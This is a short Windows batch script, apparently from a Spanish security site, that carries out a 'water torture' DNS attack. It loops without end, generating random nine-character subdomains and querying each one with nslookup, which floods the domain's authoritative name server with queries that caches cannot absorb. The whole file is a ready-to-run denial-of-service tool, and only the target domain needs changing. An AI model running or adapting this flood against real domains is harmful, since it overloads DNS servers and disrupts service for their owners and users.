@echo off
ECHO Water Torture DNS autoritativo. (c) hackingyseguridad 2017. Version 3.
:inicio
set pas=
set s=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
set m=0
:loop
set /a n=%random% %% 62
call set pas=%pas%%%s:~%n%,1%%
set /a m=m+1
if not %m%==9 goto loop:
nslookup %pas%.hackingyseguridad.es
goto inicio